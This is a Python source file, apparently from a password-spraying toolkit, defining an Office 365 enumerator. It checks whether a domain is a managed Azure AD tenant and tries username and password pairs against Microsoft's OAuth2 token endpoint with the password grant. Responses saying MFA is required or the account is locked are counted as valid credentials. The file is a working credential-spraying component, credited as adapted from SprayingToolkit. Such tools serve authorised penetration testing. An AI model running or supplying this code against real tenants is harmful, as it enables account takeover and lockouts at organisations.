import json
import os
import uuid

import requests
from requests_ntlm import HttpNtlmAuth

from db.enums.errors import AadError
from enumerators.enumerator import VpnEnumerator, ScanType
from bs4 import BeautifulSoup

from utils.ntlmdecoder import ntlmdecode
from utils.utils import time_label, logfile, get_project_root, random_ascii_string, error

# Disclaimer
# The code for the OWA enumerator has been copied and adapted from SprayingToolkit
# https://github.com/byt3bl33d3r/SprayingToolkit/blob/master/core/sprayers/owa.py
# CREDIT: @byt3bl33d3r
from validators.o365creeper import O365Creeper
from validators.o365enum import O365Enum


class O365Enumerator(VpnEnumerator):
    def __init__(self, target, group=None):
        super().__init__()
        self.target = target
        self.auth_url = "https://login.microsoft.com/common/oauth2/token"

    def logfile(self, st: ScanType) -> str:
        fmt = os.path.basename(self.config.get("LOGGING", "file"))
        return str(get_project_root().joinpath("data").joinpath(logfile(fmt=fmt, script=__file__, scan_type=st.name)))

    def validate(self) -> bool:
        url = f"https://login.microsoftonline.com:443/getuserrealm.srf?login={self.target}"
        res = self.session.get(url)
        user_realm = res.json()
        return "NameSpaceType" in user_realm.keys() and user_realm["NameSpaceType"] in ["Unknown", "Managed"]

    def get_error(self, error):
        return AadError.from_str(error)

    def login(self, username, password) -> bool:
        data = {
            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
            "grant_type": "password",
            "resource": "https://graph.windows.net",
            "scope": "openid",
            "username": username,
            "password": password
        }

        res = self.session.post(self.auth_url, data=data)
        auth_data = res.json()
        err = None
        if "access_token" in auth_data.keys():
            return True
        if "error_description" in auth_data.keys():
            err = self.get_error(auth_data["error_description"])
        if err == AadError.MFA_NEEDED:
            error(f"{username} need MFA", indent=2)
            return True
        elif err == AadError.LOCKED:
            error(f"{username} is locked", indent=2)
            return True
        return False
